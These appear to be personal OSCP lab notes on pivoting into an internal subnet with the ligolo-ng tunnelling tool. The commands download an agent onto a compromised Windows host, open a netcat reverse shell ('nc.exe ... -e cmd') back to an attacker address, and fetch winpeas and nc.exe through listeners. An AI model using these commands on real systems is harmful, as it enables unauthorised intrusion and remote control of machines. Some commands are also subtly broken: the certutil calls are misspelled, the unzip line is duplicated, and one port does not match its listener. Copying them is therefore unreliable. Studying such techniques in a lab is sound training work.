![[Pasted image 20240205124349.png]]


https://youtu.be/DM1B8S80EvQ 

1. Download ligolo-ng from github - https://github.com/nicocha30/ligolo-ng (Need to download 4 files, agent and proxy for both linux and windows)

2. unzip it. 
```
unzip ligolo-ng_proxy_0.5.1_windows_amd64.zip
-----------------
unzip ligolo-ng_proxy_0.5.1_windows_amd64.zip 
-----------------
```

3. Start it on local machine (linux)
```
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up  

./linproxy -selfcert
```

4. Start is on agent after transferring file (windows)
```
PS C:\Users\dmzadmin\Desktop> iwr -uri http://192.168.45.242:8000/winagent.exe  -Outfile agent.exe

PS C:\Users\dmzadmin\Desktop> .\agent.exe -connect 192.168.45.242:11601 -ignore-cert
time="2024-02-16T05:06:12-08:00" level=warning msg="warning, certificate validation disabled"
time="2024-02-16T05:06:12-08:00" level=info msg="Connection established" addr="192.168.45.242:11601"
```

5. Connected

6. Ligolog session and ip check 
```
1. session - select right session number and then 
    start 

3. ifconfig 
Agent : LOGIN\dmzadmin@login] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:86:62:05              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.194.191/24             │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:86:d7:20              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.84.254/24               │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
```


8. Add internal network subnet and add in kali route list
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ sudo ip route add 172.16.84.0/24 dev ligolo
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
                                                                             
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ip route list                                                  
default via 192.168.189.2 dev eth0 proto dhcp src 192.168.189.131 metric 100 
10.11.0.0/16 via 192.168.45.254 dev tun0 
172.16.84.0/24 dev ligolo scope link linkdown 
192.168.45.0/24 dev tun0 proto kernel scope link src 192.168.45.242 
192.168.189.0/24 dev eth0 proto kernel scope link src 192.168.189.131 metric 100 
192.168.194.0/24 via 192.168.45.254 dev tun0 


sudo ip route del 172.16.84.0/24 dev ligolo
```

9. Add listener for reverse shell - at ligolo local side 
```
1. In Linux
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 
(listener_list - show the listener list)
# Any incoming traffic from agent internal subnet at port 1234 will be directed to local host port 4444

2. In windows
nc.exe 10.10.120.131 1234 -e cmd

# Agent is sending reverse shell at port 1234


3. Receive reverseh shell. 
nc -lvnp 4444 

# listening at 4444 because listner is directing traffic to local host 4444

```

10. File transfer 
```
1. In linux 
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
# the http python server is runnig at 80 so its local host is on 80

2. Transferring winpeas at windows 

curtutil -urlchache -f http://10.10.120.131:12345/winpeas winpeas

curtutil -urlchache -f http://192.168.209.191:1238/nc.exe nc.exe

```